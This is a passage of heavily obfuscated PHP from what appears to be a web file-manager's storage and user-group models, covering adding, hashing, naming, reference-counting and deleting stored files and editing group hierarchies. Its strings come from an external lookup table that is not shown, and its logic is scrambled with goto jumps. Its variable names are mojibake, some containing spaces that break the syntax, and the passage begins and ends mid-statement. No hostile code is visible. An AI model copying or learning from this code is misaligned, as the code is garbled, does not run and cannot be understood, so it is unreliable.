"\151\x6f\137\146\151\154\x65\137\x6d\x65\164\141", "\x6d\x65\164\x61\x46\151\x65\x6c\144" => "\x66\151\154\145\x49\x44"); public function fileInfo($Cé‡ùÒ÷–) { $D×œ™ÔÓÖ =& $_SERVER[í™]; static $AËÒïŸø½— = array(); if (!isset($AËÒïŸø½—[$Cé‡ùÒ÷–])) { $A¢Í½ÂÜÖ = $D×œ™ÔÓÖ[2135]; $e„ÓÓôğÂ = Model($D×œ™ÔÓÖ[422])->field($A¢Í½ÂÜÖ)->where(array($D×œ™ÔÓÖ[420] => $Cé‡ùÒ÷–))->find(); $AËÒïŸø½—[$Cé‡ùÒ÷–] = $e„ÓÓôğÂ; } return $AËÒïŸø½—[$Cé‡ùÒ÷–]; } public function addFileByContent($EéùÇ†¡¶ = '', $eåÄ»Ş”Œ = '') { goto Dœ–òÉ—¥´; cõÏŸ¼Œ†¸: $dâÎÕ½×¬ = $C¶ö™‰ËÚ× . $a»à½¦ĞÂ·[2137] . rand_string(16); file_put_contents($dâÎÕ½×¬, $EéùÇ†¡¶); $BùŒ’¨‘ = $this->addFile($dâÎÕ½×¬, $eåÄ»Ş”Œ, !0); goto aÍÚ¬äØ‚; Dœ–òÉ—¥´: $a»à½¦ĞÂ· =& $_SERVER[í™]; $C¶ö™‰ËÚ× = TEMP_PATH . $a»à½¦ĞÂ·[2136]; if (!is_dir($C¶ö™‰ËÚ×)) { mk_dir($C¶ö™‰ËÚ×); } goto cõÏŸ¼Œ†¸; aÍÚ¬äØ‚: if (file_exists($dâÎÕ½×¬)) { @unlink($dâÎÕ½×¬); } return $BùŒ’¨‘; goto aŠëÅî‘Ñ”; aŠëÅî‘Ñ”: } public function createFileName($a«“†æ·¡×) { goto c»°‹‘÷ç; c»°‹‘÷ç: $b‚’Ÿ™ö¡· =& $_SERVER[í™]; $eí…•‡í§× = IO::init($b‚’Ÿ™ö¡·[8]); $E¡×˜ºæÖ° = $this->makeFilePath($a«“†æ·¡×, $eí…•‡í§×); goto E…éö£©¸; FŸ¤Ó¯ˆŠ’: if (!$Bì×‡„à¯‚ && !Cache::get($c‚¼ª“¤Ü)) { $Bì×‡„à¯‚ = !0; $e•Œ˜†£ˆ¸ = IO::mkdir($eŒèœò‡); if (!IO::exist($e•Œ˜†£ˆ¸ . $b‚’Ÿ™ö¡·[2139])) { IO::mkfile($e•Œ˜†£ˆ¸ . $b‚’Ÿ™ö¡·[2139]); } Cache::set($c‚¼ª“¤Ü, 1, 3600 * 2); } return $E¡×˜ºæÖ°; goto cœÀ†ÚÕ; E…éö£©¸: $eŒèœò‡ = $eí…•‡í§×->pathFather($E¡×˜ºæÖ°); static $Bì×‡„à¯‚ = false; $c‚¼ª“¤Ü = $b‚’Ÿ™ö¡·[2138] . md5($eŒèœò‡); goto FŸ¤Ó¯ˆŠ’; cœÀ†ÚÕ: } public function makeFilePath($c‹†é¥Ñàğ, $c¶†°ª•Æå) { goto dÒ‘ŠåŞÄí; c¸×ÆÃêŞŠ: $dŒğÊÓ¾óÏ = $Eí”«ùí× . rand_string(5) . short_id(100); $c‹†é¥Ñàğ = str_replace($a»ñ¹œª®ô[8], $a»ñ¹œª®ô[70], KodIO::clear($c‹†é¥Ñàğ)); if (!$c‹†é¥Ñàğ) { $E“÷Ñ­ ³³ = $a»ñ¹œª®ô[2142]; } goto EŸÍ’ÜÏåŒ; dÒ‘ŠåŞÄí: $a»ñ¹œª®ô =& $_SERVER[í™]; $E“÷Ñ­ ³³ = Model($a»ñ¹œª®ô[1074])->get($a»ñ¹œª®ô[2140]); $Eí”«ùí× = KodIO::defaultIO() . date($a»ñ¹œª®ô[2141]); goto c¸×ÆÃêŞŠ; EŸÍ’ÜÏåŒ: switch ($E“÷Ñ­ ³³) { case $a»ñ¹œª®ô[2143]: $dŒğÊÓ¾óÏ = $dŒğÊÓ¾óÏ . $a»ñ¹œª®ô[91] . $c¶†°ª•Æå->ext($c‹†é¥Ñàğ); if ($c¶†°ª•Æå->ext($c‹†é¥Ñàğ) == $a»ñ¹œª®ô[2084]) { $dŒğÊÓ¾óÏ .= $a»ñ¹œª®ô[1324]; } break; case $a»ñ¹œª®ô[2144]: goto Bëåö—§‹¦; AÒÌ’íå¢„: if (IO::isTypeObject() && !IO::isUploadServer()) { IO::setContent($dŒğÊÓ¾óÏ, $a»ñ¹œª®ô[33]); } CacheLock::unlock($Böº‹å²±); break; goto e‡ß³²œ‚; fö‰ôƒ„: $Eí”«ùí× = $a»ñ¹œª®ô[2145] . $aÅØª‚¿óò[$a»ñ¹œª®ô[367]] . $a»ñ¹œª®ô[2146] . date($a»ñ¹œª®ô[2147]) . $AÎèÈÈåô» . $a»ñ¹œª®ô[8]; if ($c¶†°ª•Æå->ext($c‹†é¥Ñàğ) == $a»ñ¹œª®ô[2084]) { $c‹†é¥Ñàğ .= $a»ñ¹œª®ô[1324]; } $Böº‹å²± = $a»ñ¹œª®ô[2148] . $Eí”«ùí× . $c‹†é¥Ñàğ; goto Cë°ôñ¥ñá; Bëåö—§‹¦: $b’Àê¯ğ‹ = Model($a»ñ¹œª®ô[1074])->get($a»ñ¹œª®ô[1320]); $AÎèÈÈåô» = substr(md5($a»ñ¹œª®ô[1903] . $b’Àê¯ğ‹ . date($a»ñ¹œª®ô[669])), 0, 8); $aÅØª‚¿óò = KodIO::defaultDriver(); goto fö‰ôƒ„; Cë°ôñ¥ñá: CacheLock::lock($Böº‹å²±); $Bî×·Å“Ñ = IO::fileNameAuto($Eí”«ùí×, $c‹†é¥Ñàğ); $dŒğÊÓ¾óÏ = $Eí”«ùí× . $Bî×·Å“Ñ; goto AÒÌ’íå¢„; e‡ß³²œ‚: case $a»ñ¹œª®ô[2142]: break; default: break; } return $dŒğÊÓ¾óÏ; goto B¾™’Àø”è; B¾™’Àø”è: } public function addFileByRemote($Eø¼ø”æ¤™, $Dè®ÖãÅƒ, $a’²ã›½‘ƒ = array()) { goto aóš•ç©¬ø; aóš•ç©¬ø: $AôøÑçá°Ä =& $_SERVER[í™]; if (!IO::exist($Eø¼ø”æ¤™)) { return !1; } $e³º¿¸ê = $a’²ã›½‘ƒ[$AôøÑçá°Ä[163]] ? $a’²ã›½‘ƒ[$AôøÑçá°Ä[163]] : $AôøÑçá°Ä[33]; goto DÕù‘É¸É; cŒˆ ŒĞê´: if ($då°±ğŠš = $this->addFileCheckExist($e¢Ñ³á¾[$AôøÑçá°Ä[164]], $e¢Ñ³á¾[$AôøÑçá°Ä[163]], $e¢Ñ³á¾[$AôøÑçá°Ä[77]])) { return $då°±ğŠš; } return $this->addFileData($e¢Ñ³á¾); goto aÖ¬ø¼Æ²§; DÕù‘É¸É: $A¨ï©ğÈ“ = IO::hashMd5($Eø¼ø”æ¤™, $e³º¿¸ê); $BÙªÊ§‹×Ö = KodIO::defaultDriver(); $e¢Ñ³á¾ = array($AôøÑçá°Ä[522] => IO::size($Eø¼ø”æ¤™), $AôøÑçá°Ä[2149] => 1, $AôøÑçá°Ä[386] => $Dè®ÖãÅƒ, $AôøÑçá°Ä[717] => $BÙªÊ§‹×Ö[$AôøÑçá°Ä[367]], $AôøÑçá°Ä[387] => $Eø¼ø”æ¤™, $AôøÑçá°Ä[2150] => $a’²ã›½‘ƒ[$AôøÑçá°Ä[164]] ? $a’²ã›½‘ƒ[$AôøÑçá°Ä[164]] : IO::hashSimple($Eø¼ø”æ¤™), $AôøÑçá°Ä[2151] => $A¨ï©ğÈ“ ? $A¨ï©ğÈ“ : $e³º¿¸ê); goto cŒˆ ŒĞê´; aÖ¬ø¼Æ²§: } private function addFileData($dÇÍšĞƒ’™) { $bœº‰İ‘µÄ =& $_SERVER[í™]; if (!$dÇÍšĞƒ’™) { return !1; } $dÇÍšĞƒ’™[$bœº‰İ‘µÄ[77]] = intval($dÇÍšĞƒ’™[$bœº‰İ‘µÄ[77]]); if (!$dÇÍšĞƒ’™[$bœº‰İ‘µÄ[77]] && strlen($dÇÍšĞƒ’™[$bœº‰İ‘µÄ[164]]) > 32) { $dÇÍšĞƒ’™[$bœº‰İ‘µÄ[77]] = intval(substr($dÇÍšĞƒ’™[$bœº‰İ‘µÄ[164]], 32)); } $e¦¨ó¡öÍ = $this->add($dÇÍšĞƒ’™); return $this->find($e¦¨ó¡öÍ); } public function addFile($dµÔ»³¢†Ï, $e¤é°Ğ·, $C°é†ï¼±Ş = false) { goto b¥¾ù¢¸ì¾; C×’óÍ†óù: $bµÕÊ‡äìª = $_SERVER[í™][2152] . $CªÏ±‡„“÷; CacheLock::lock($bµÕÊ‡äìª); if ($FŸÒğõŸ—Á = $this->addFileCheckExist($B¹ßô¸Ä, $CªÏ±‡„“÷, $eË©£ñ‘Ä)) { CacheLock::unlock($bµÕÊ‡äìª); return $FŸÒğõŸ—Á; } goto aí‹ÆÆí‘¶; eƒê¡ÒçŞ: return $cÉ–…Ç³·Š; goto eªÙ³ÏºÍØ; aí‹ÆÆí‘¶: $A´ï¥¼ŸÜŞ = $this->addFileMake($dµÔ»³¢†Ï, $eË©£ñ‘Ä, $B¹ßô¸Ä, $CªÏ±‡„“÷, $e¤é°Ğ·, $C°é†ï¼±Ş); $cÉ–…Ç³·Š = $this->addFileData($A´ï¥¼ŸÜŞ); CacheLock::unlock($bµÕÊ‡äìª); goto eƒê¡ÒçŞ; b¥¾ù¢¸ì¾: $B¹ßô¸Ä = IO::hashSimple($dµÔ»³¢†Ï); $CªÏ±‡„“÷ = IO::hashMd5($dµÔ»³¢†Ï); $eË©£ñ‘Ä = IO::size($dµÔ»³¢†Ï); goto C×’óÍ†óù; eªÙ³ÏºÍØ: } public function addFileMake($EšºóÓà÷, $e§³Ø¦›äÌ, $DíğŠ½àœ©, $ağÍî‰–¤, $aŒÉµÉÚÊ, $E‰º™É£) { goto AÉ÷ŞŒÖØò; CóŒ—ŒºÃÁ: $a…†¤ºØæ = KodIO::defaultDriver(); $b¡¹·ÑèíŠ = array($F‹ ½ÈŠÇÛ[522] => $e§³Ø¦›äÌ, $F‹ ½ÈŠÇÛ[2149] => 1, $F‹ ½ÈŠÇÛ[386] => $aŒÉµÉÚÊ, $F‹ ½ÈŠÇÛ[717] => $a…†¤ºØæ[$F‹ ½ÈŠÇÛ[367]], $F‹ ½ÈŠÇÛ[387] => $EƒğÒŒ»Ó, $F‹ ½ÈŠÇÛ[2150] => $DíğŠ½àœ©, $F‹ ½ÈŠÇÛ[2151] => $ağÍî‰–¤); return $b¡¹·ÑèíŠ; goto cğêà¹¡©; A‡¦ÙÚ±¨è: $c¦å¢ô‰«· = get_path_this($EƒğÒŒ»Ó); if ($E‰º™É£) { $AÜêòëÃèß = IO::move($EšºóÓà÷, $E“åµ©†îø, !1, $c¦å¢ô‰«·); } else { $AÜêòëÃèß = IO::copy($EšºóÓà÷, $E“åµ©†îø, !1, $c¦å¢ô‰«·); } if (!$AÜêòëÃèß) { return !1; } goto CóŒ—ŒºÃÁ; AÉ÷ŞŒÖØò: $F‹ ½ÈŠÇÛ =& $_SERVER[í™]; $EƒğÒŒ»Ó = $this->createFileName($aŒÉµÉÚÊ); $E“åµ©†îø = get_path_father($EƒğÒŒ»Ó); goto A‡¦ÙÚ±¨è; cğêà¹¡©: } public function addFileCheckExist($DÚ“·Á“ï, $DÀ ¡İÃˆÌ, $b×ªÄ‡ˆÉË) { $f°Ë³‘ÒÇâ =& $_SERVER[í™]; $e¸ÕŸºÁŸ = $this->findByHash($DÚ“·Á“ï, $DÀ ¡İÃˆÌ); if (!$e¸ÕŸºÁŸ) { return !1; } $F½³ÉÅ¶ò = array($f°Ë³‘ÒÇâ[2149] => intval($e¸ÕŸºÁŸ[$f°Ë³‘ÒÇâ[2153]]) + 1, $f°Ë³‘ÒÇâ[522] => $b×ªÄ‡ˆÉË); $this->where(array($f°Ë³‘ÒÇâ[420] => $e¸ÕŸºÁŸ[$f°Ë³‘ÒÇâ[419]]))->save($F½³ÉÅ¶ò); return $e¸ÕŸºÁŸ; } public function remove($CÅéŸŸÓ„Æ) { $this->linkCountChange($CÅéŸŸÓ„Æ, !1); $this->clearEmpty(); return !0; } public function linkAdd($FÖ˜İÊĞ¯) { $this->linkCountChange($FÖ˜İÊĞ¯, !0); } public function linkCountChange($EéšÛ²Ÿ‡”, $FóïÜëÀÍ±) { goto DÆ©¢éæô; d¸ôó‰Ï­: $c–Üğ¼…ù = array(); foreach ($EéšÛ²Ÿ‡” as $F¼ˆ¹Ë¿ è) { $BØ»„¢ºè = $F¼ˆ¹Ë¿ è . $f¦¥¨ì‰µã[33]; if (!$c–Üğ¼…ù[$BØ»„¢ºè]) { $c–Üğ¼…ù[$BØ»„¢ºè] = 0; } $c–Üğ¼…ù[$BØ»„¢ºè]++; } $aŞ‹©…›Ğô = array(); goto A‰§ŸğĞÒŠ; DÆ©¢éæô: $f¦¥¨ì‰µã =& $_SERVER[í™]; if (!$EéšÛ²Ÿ‡”) { return; } if (!is_array($EéšÛ²Ÿ‡”)) { $EéšÛ²Ÿ‡” = array($EéšÛ²Ÿ‡”); } goto d¸ôó‰Ï­; A‰§ŸğĞÒŠ: foreach ($c–Üğ¼…ù as $F¼ˆ¹Ë¿ è => $Dõåà¼…ÙÄ) { $BØ»„¢ºè = $Dõåà¼…ÙÄ . $f¦¥¨ì‰µã[33]; if (!$aŞ‹©…›Ğô[$BØ»„¢ºè]) { $aŞ‹©…›Ğô[$BØ»„¢ºè] = array(); } $aŞ‹©…›Ğô[$BØ»„¢ºè][] = $F¼ˆ¹Ë¿ è; } foreach ($aŞ‹©…›Ğô as $Dõåà¼…ÙÄ => $dÇŸôîêë) { if (!$dÇŸôîêë) { continue; } $Dõåà¼…ÙÄ = $FóïÜëÀÍ± ? $Dõåà¼…ÙÄ : -intval($Dõåà¼…ÙÄ); $aÆ•ª×İˆ = array($f¦¥¨ì‰µã[419] => array($f¦¥¨ì‰µã[7], $dÇŸôîêë)); if ($Dõåà¼…ÙÄ < 0) { $aÆ•ª×İˆ[$f¦¥¨ì‰µã[2153]] = array($f¦¥¨ì‰µã[914], abs($Dõåà¼…ÙÄ)); } $this->where($aÆ•ª×İˆ)->setAdd($f¦¥¨ì‰µã[2153], $Dõåà¼…ÙÄ); } goto Cå¾…«¤–Î; Cå¾…«¤–Î: } public function findByHash($eº²…¾ØŒî, $E´‰®”´¸ = false) { $aõÜø•Ì¬¥ =& $_SERVER[í™]; if (!$eº²…¾ØŒî && !$E´‰®”´¸) { return !1; } $CˆÉÁß¿˜ = array($aõÜø•Ì¬¥[2150] => $eº²…¾ØŒî); if ($E´‰®”´¸) { $CˆÉÁß¿˜ = array($aõÜø•Ì¬¥[2151] => $E´‰®”´¸); } return $this->order($aõÜø•Ì¬¥[2154])->where($CˆÉÁß¿˜)->find(); } public function clearEmpty($d†É­“¢„ = 0) { goto eÖêõáéœÆ; F†Ñè’§: foreach ($DÎÆ‹‡ÔÍè as $EÄ†ÉÅµ„…) { $Bã©Ğ»ôË->update(1); $this->resetFile($EÄ†ÉÅµ„…); } $Bã©Ğ»ôË->end(); goto fç÷Áã¹ÁÀ; eÖêõáéœÆ: $dÌ¡“¬÷Ï³ =& $_SERVER[í™]; $BÌ Ö­êÅ = time() - 3600 * 24 * $d†É­“¢„; $DÄÊ­ğâÊ = $dÌ¡“¬÷Ï³[2155] . $BÌ Ö­êÅ; goto C·‰Û‡³; C·‰Û‡³: $DÎÆ‹‡ÔÍè = $this->where($DÄÊ­ğâÊ)->select(); if (!$DÎÆ‹‡ÔÍè) { return; } $Bã©Ğ»ôË = new Task($dÌ¡“¬÷Ï³[2156], $dÌ¡“¬÷Ï³[33], count($DÎÆ‹‡ÔÍè)); goto F†Ñè’§; fç÷Áã¹ÁÀ: } public function resetFile($aªùöšï¬£) { goto e›ßøÖŞßÓ; CÖ’‰ß”ÕĞ: if ($aªùöšï¬£[$C¯ÁŸ´¯‰†[2153]] != $fŸ‹·„ì„Ö) { $this->where($F©îë´Ğ‘)->save(array($C¯ÁŸ´¯‰†[2149] => $fŸ‹·„ì„Ö)); } goto dô¡Ü‹ô¿¶; c¦×°ãÁŒô: $d†£´©¬Š¤ = Model($C¯ÁŸ´¯‰†[2157])->where($F©îë´Ğ‘)->count(); $fŸ‹·„ì„Ö = intval($fÛ‹‘Êƒ½£) + intval($d†£´©¬Š¤); if ($fŸ‹·„ì„Ö == 0) { IO::remove($aªùöšï¬£[$C¯ÁŸ´¯‰†[75]]); $this->where($F©îë´Ğ‘)->delete(); $this->metaSet($aªùöšï¬£[$C¯ÁŸ´¯‰†[419]], null, null); return; } goto CÖ’‰ß”ÕĞ; e›ßøÖŞßÓ: $C¯ÁŸ´¯‰† =& $_SERVER[í™]; $F©îë´Ğ‘ = array($C¯ÁŸ´¯‰†[420] => $aªùöšï¬£[$C¯ÁŸ´¯‰†[419]]); $fÛ‹‘Êƒ½£ = Model($C¯ÁŸ´¯‰†[1103])->where($F©îë´Ğ‘)->count(); goto c¦×°ãÁŒô; dô¡Ü‹ô¿¶: } public function storageInfo($d»ÔôéÜ¢ï = false) { goto CÚÀš§¶èª; CÚÀš§¶èª: $FçÊ²²ë”Â =& $_SERVER[í™]; $F¢Â‡ª› = $this->count() + 0.0; $eÛè±È©Çƒ = 0; goto E¬Åª’ù; Aê‘°±äŸ: for ($cóƒ¤ë³¡± = 0; $cóƒ¤ë³¡± < $F¢Â‡ª›; $cóƒ¤ë³¡± = $cóƒ¤ë³¡± + $A¸ñ¸»èñ) { $eóÆÄÀ¡‹¢ = $this->limit($cóƒ¤ë³¡±, $cóƒ¤ë³¡± + $A¸ñ¸»èñ)->select(); foreach ($eóÆÄÀ¡‹¢ as $E”™¾°£Ö) { $DÔÛ‹§ğ¹« += $E”™¾°£Ö[$FçÊ²²ë”Â[77]] * $E”™¾°£Ö[$FçÊ²²ë”Â[2153]]; $eÛè±È©Çƒ += $E”™¾°£Ö[$FçÊ²²ë”Â[77]] * ($E”™¾°£Ö[$FçÊ²²ë”Â[2153]] - 1); $bğº’¥Üù™ += $E”™¾°£Ö[$FçÊ²²ë”Â[2153]]; } } $Aâ¬»Ï¥’ƒ = array($FçÊ²²ë”Â[2158] => $DÔÛ‹§ğ¹«, $FçÊ²²ë”Â[2159] => $eÛè±È©Çƒ, $FçÊ²²ë”Â[2160] => $eÛè±È©Çƒ / $DÔÛ‹§ğ¹«, $FçÊ²²ë”Â[81] => $F¢Â‡ª›, $FçÊ²²ë”Â[2161] => $bğº’¥Üù™); return $Aâ¬»Ï¥’ƒ; goto AŸÍ¨„‡È•; E¬Åª’ù: $DÔÛ‹§ğ¹« = 1; $bğº’¥Üù™ = 0; $A¸ñ¸»èñ = 5000; goto Aê‘°±äŸ; AŸÍ¨„‡È•: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\164\141\142\x6c\x65\116\x61\155\x65" => "\147\x72\157\165\160\x5f\155\x65\164\141", "\x6d\x65\x74\141\x46\x69\x65\x6c\144" => "\147\x72\157\x75\x70\111\x44"); protected function cacheFunctionAlias($FîÍÛÇøĞ) { $A¿ñ˜†±ãˆ =& $_SERVER[í™]; return array($A¿ñ˜†±ãˆ[2162] => array($FîÍÛÇøĞ[0], $A¿ñ˜†±ãˆ[2163]), $A¿ñ˜†±ãˆ[2164] => array($FîÍÛÇøĞ[0], $A¿ñ˜†±ãˆ[2163])); } protected function getInfo($C¨šÔç‚·) { $a‚…½ÅóíÇ = $this->getInfoSimple($C¨šÔç‚·); if (!$a‚…½ÅóíÇ) { return !1; } return $this->_listDataApplyItem($a‚…½ÅóíÇ); } protected function getInfoSimple($a¯„™‰Ü¨¨, $e¤Œ×“Ï˜Ÿ = false) { $b‘î¯´èĞ =& $_SERVER[í™]; if ($e¤Œ×“Ï˜Ÿ) { $Bè‘‹ˆÖ£“ = array($b‘î¯´èĞ[2094] => intval($a¯„™‰Ü¨¨)); $bÀÆ»Óé‡ = $this->where($Bè‘‹ˆÖ£“)->find(); return is_array($bÀÆ»Óé‡) ? $bÀÆ»Óé‡ : array(); } return $this->cacheFunctionGet($b‘î¯´èĞ[2165], $a¯„™‰Ü¨¨); } protected function groupAdd($Eµˆ°¦¦Şù) { goto BÈ¼¾À£¤Ä; F×¾Ò‚¿: if (isset($Eµˆ°¦¦Şù[$Cß¸ğîè[2168]])) { $this->metaSet($fÂˆğïÆ›, array($Cß¸ğîè[2168] => $Eµˆ°¦¦Şù[$Cß¸ğîè[2168]], $Cß¸ğîè[2169] => $Eµˆ°¦¦Şù[$Cß¸ğîè[2169]])); unset($Eµˆ°¦¦Şù[$Cß¸ğîè[2168]]); unset($Eµˆ°¦¦Şù[$Cß¸ğîè[2169]]); } Model($Cß¸ğîè[1103])->groupRootAdd($fÂˆğïÆ›); return $fÂˆğïÆ›; goto AÙ«ìÄéš; cÄ£éÚ§æ: if ($d‚„¾ÛºêŸ[$Cß¸ğîè[461]]) { $bÌ”ÔåŒğÏ = $d‚„¾ÛºêŸ[$Cß¸ğîè[461]] . $d‚„¾ÛºêŸ[$Cß¸ğîè[2094]] . $Cß¸ğîè[47]; } $BÒœ‡ÖÕ = array($Cß¸ğîè[386] => $this->groupNameAuto($Eµˆ°¦¦Şù[$Cß¸ğîè[463]], $Eµˆ°¦¦Şù[$Cß¸ğîè[28]]), $Cß¸ğîè[368] => $Eµˆ°¦¦Şù[$Cß¸ğîè[463]], $Cß¸ğîè[527] => $bÌ”ÔåŒğÏ, $Cß¸ğîè[2166] => $Eµˆ°¦¦Şù[$Cß¸ğîè[2078]], $Cß¸ğîè[2167] => 0, $Cß¸ğîè[2098] => 0); if (isset($Eµˆ°¦¦Şù[$Cß¸ğîè[2115]])) { $BÒœ‡ÖÕ[$Cß¸ğîè[2115]] = $Eµˆ°¦¦Şù[$Cß¸ğîè[2115]]; } else { $CÙ¡Ü¾éÏÁ = $this->max($Cß¸ğîè[2115]); if (!$CÙ¡Ü¾éÏÁ) { $CÙ¡Ü¾éÏÁ = 0; } $BÒœ‡ÖÕ[$Cß¸ğîè[2115]] = $CÙ¡Ü¾éÏÁ + 1; } goto EèİñËòÜˆ; BÈ¼¾À£¤Ä: $Cß¸ğîè =& $_SERVER[í™]; if (!$Eµˆ°¦¦Şù[$Cß¸ğîè[463]] && isset($Eµˆ°¦¦Şù[$Cß¸ğîè[2094]]) && $Eµˆ°¦¦Şù[$Cß¸ğîè[2094]] == 1) { if ($d‚„¾ÛºêŸ = $this->getInfoSimple($Eµˆ°¦¦Şù[$Cß¸ğîè[2094]], !0)) { return $Eµˆ°¦¦Şù[$Cß¸ğîè[2094]]; } } else { $d‚„¾ÛºêŸ = $this->getInfoSimple($Eµˆ°¦¦Şù[$Cß¸ğîè[463]]); if (!$d‚„¾ÛºêŸ) { return !1; } } $bÌ”ÔåŒğÏ = $Cß¸ğîè[472]; goto cÄ£éÚ§æ; EèİñËòÜˆ: if (!empty($Eµˆ°¦¦Şù[$Cß¸ğîè[2094]])) { $BÒœ‡ÖÕ[$Cß¸ğîè[2094]] = $Eµˆ°¦¦Şù[$Cß¸ğîè[2094]]; } $fÂˆğïÆ› = $this->add($BÒœ‡ÖÕ); $this->setNamePinyin($fÂˆğïÆ›, $BÒœ‡ÖÕ[$Cß¸ğîè[28]]); goto F×¾Ò‚¿; AÙ«ìÄéš: } protected function groupEdit($c»Ğ·ÜÉ•, $d‰£Èêİ¨) { $Aƒôç®Â =& $_SERVER[í™]; if (!empty($d‰£Èêİ¨[$Aƒôç®Â[463]])) { $F¿ ®øâ·¡ = $this->getInfoSimple($c»Ğ·ÜÉ•); $FÜÅ¹µÁóî = $this->getInfoSimple($d‰£Èêİ¨[$Aƒôç®Â[463]]); if (!$F¿ ®øâ·¡ || !$FÜÅ¹µÁóî) { return !1; } if ($F¿ ®øâ·¡[$Aƒôç®Â[2094]] == $FÜÅ¹µÁóî[$Aƒôç®Â[2094]]) { return !1; } if ($d‰£Èêİ¨[$Aƒôç®Â[463]] != $F¿ ®øâ·¡[$Aƒôç®Â[463]]) { if ($FÜÅ¹µÁóî[$Aƒôç®Â[461]] !== $F¿ ®øâ·¡[$Aƒôç®Â[461]] && strpos($FÜÅ¹µÁóî[$Aƒôç®Â[461]], $F¿ ®øâ·¡[$Aƒôç®Â[461]] . $F¿ ®øâ·¡[$Aƒôç®Â[2094]] . $Aƒôç®Â[47]) === 0) { return !1; } $d‰£Èêİ¨[$Aƒôç®Â[527]] = $FÜÅ¹µÁóî[$Aƒôç®Â[461]] . $d‰£Èêİ¨[$Aƒôç®Â[463]] . $Aƒôç®Â[47]; $this->_changeChildLevel($F¿ ®øâ·¡, $FÜÅ¹µÁóî); } } if (isset($d‰£Èêİ¨[$Aƒôç®Â[28]])) { $this->setNamePinyin($c»Ğ·ÜÉ•, $d‰£Èêİ¨[$Aƒôç®Â[28]]); } if (isset($d‰£Èêİ¨[$Aƒôç®Â[2168]])) { $this->metaSet($c»Ğ·ÜÉ•, array($Aƒôç®Â[2168] => $d‰£Èêİ¨[$Aƒôç®Â[2168]], $Aƒôç®Â[2169] => $d‰£Èêİ¨[$Aƒôç®Â[2169]])); unset($d‰£Èêİ¨[$Aƒôç®Â[2168]]); unset($d‰£Èêİ¨[$Aƒôç®Â[2169]]); } return $this->where(array($Aƒôç®Â[2170] => $c»Ğ·ÜÉ•))->save($d‰£Èêİ¨); } private function _changeChildLevel($a†˜Š•µä, $Aåó·ÆÉÒí, $eİåâİÏ¾¾ = false) { goto ešÁ”´Ÿ¸â; ešÁ”´Ÿ¸â: $cÍŞ«£ˆ… =& $_SERVER[í™]; $Eå§«®ÜÒâ = $a†˜Š•µä[$cÍŞ«£ˆ…[461]] . $a†˜Š•µä[$cÍŞ«£ˆ…[2094]] . $cÍŞ«£ˆ…[47]; $EËâÌŒš‡­ = $Aåó·ÆÉÒí[$cÍŞ«£ˆ…[461]] . $Aåó·ÆÉÒí[$cÍŞ«£ˆ…[2094]] . $cÍŞ«£ˆ…[47] . $a†˜Š•µä[$cÍŞ«£ˆ…[2094]] . $cÍŞ«£ˆ…[47]; goto CÒîß²ªÆ§; CÒîß²ªÆ§: if ($eİåâİÏ¾¾) { $EËâÌŒš‡­ = $Aåó·ÆÉÒí[$cÍŞ«£ˆ…[461]] . $Aåó·ÆÉÒí[$cÍŞ«£ˆ…[2094]] . $cÍŞ«£ˆ…[47]; } $C¾âíÔ×‘ = array($cÍŞ«£ˆ…[527] => array($cÍŞ«£ˆ…[485], $a†˜Š•µä[$cÍŞ«£ˆ…[461]] . $a†˜Š•µä[$cÍŞ«£ˆ…[2094]] . $cÍŞ«£ˆ…[486])); $a¤ÓÅ±š‰ = array($cÍŞ«£ˆ…[527] => array($cÍŞ«£ˆ…[536], "\162\145\x70\154\x61\143\145\x28\160\141\x72\145\x6e\164\114\x65\x76\x65\x6c\54\47{$Eå§«®ÜÒâ}\47\54\x27{$EËâÌŒš‡­}\47\x29")); goto Fôëø¡ÛÄé; Fôëø¡ÛÄé: $this->where($C¾âíÔ×‘)->data($a¤ÓÅ±š‰)->save(); goto AÛÔÅÓ’; AÛÔÅÓ’: } public function setNamePinyin($C±÷·àùõ», $CÂ¢»íİŠ™ = false) { $c¤ÆƒÚ†«Ù =& $_SERVER[í™]; if (!$CÂ¢»íİŠ™) { $CÜğà¾œ‰Ë = $this->getInfoSimple($C±÷·àùõ»); $CÂ¢»íİŠ™ = $CÜğà¾œ‰Ë[$c¤ÆƒÚ†«Ù[28]]; } if (!Input::check($CÂ¢»íİŠ™, $c¤ÆƒÚ†«Ù[530])) { $this->metaSet($C±÷·àùõ», $c¤ÆƒÚ†«Ù[416], null); $this->metaSet($C±÷·àùõ», $c¤ÆƒÚ†«Ù[415], null); return; } $Cİˆ¥ˆò°õ = array($c¤ÆƒÚ†«Ù[416] => str_replace($c¤ÆƒÚ†«Ù[50], $c¤ÆƒÚ†«Ù[33], Pinyin::encode($CÂ¢»íİŠ™)), $c¤ÆƒÚ†«Ù[415] => Pinyin::encode($CÂ¢»íİŠ™, $c¤ÆƒÚ†«Ù[531])); $this->metaSet($C±÷·àùõ», $Cİˆ¥ˆò°õ); } protected function groupStatus($d¾å–¤Á½â, $c‡°­Í‰ªØ) { goto AºªÌŠ‹¶®; AºªÌŠ‹¶®: $fè˜é†â…§ =& $_SERVER[í™]; $E±İÁ©Üí± = $this->getInfoSimple($d¾å–¤Á½â); if (!$E±İÁ©Üí±) { return !1; } goto EùÀÏœ×±; Cßšóğ„¡: foreach ($Fœ©ÏÅªÕ as $d¾å–¤Á½â) { $E¢¼›²È¥Î[] = array($fè˜é†â…§[2094] => $d¾å–¤Á½â, $fè˜é†â…§[89] => $fè˜é†â…§[671], $fè˜é†â…§[359] => $c‡°­Í‰ªØ); } return Model($fè˜é†â…§[2171])->addAll($E¢¼›²È¥Î, array(), !0); goto BÃåˆÍ‡Ê; EùÀÏœ×±: if ($c‡°­Í‰ªØ == $fè˜é†â…§[83]) { $Fœ©ÏÅªÕ = $this->parentLevelArray($E±İÁ©Üí±[$fè˜é†â…§[461]]); } else { $CÊŒÃ¦‚ó = array($fè˜é†â…§[527] => array($fè˜é†â…§[485], $E±İÁ©Üí±[$fè˜é†â…§[461]] . $E±İÁ©Üí±[$fè˜é†â…§[2094]] . $fè˜é†â…§[486])); $Fœ©ÏÅªÕ = $this->where($CÊŒÃ¦‚ó)->field($fè˜é†â…§[2094])->select(); $Fœ©ÏÅªÕ = array_to_keyvalue($Fœ©ÏÅªÕ, $fè˜é†â…§[33], $fè˜é†â…§[2094]); } $Fœ©ÏÅªÕ[] = $E±İÁ©Üí±[$fè˜é†â…§[2094]]; $E¢¼›²È¥Î = array(); goto Cßšóğ„¡; BÃåˆÍ‡Ê: } protected function groupRemove($CŠ¸×©œß) { goto 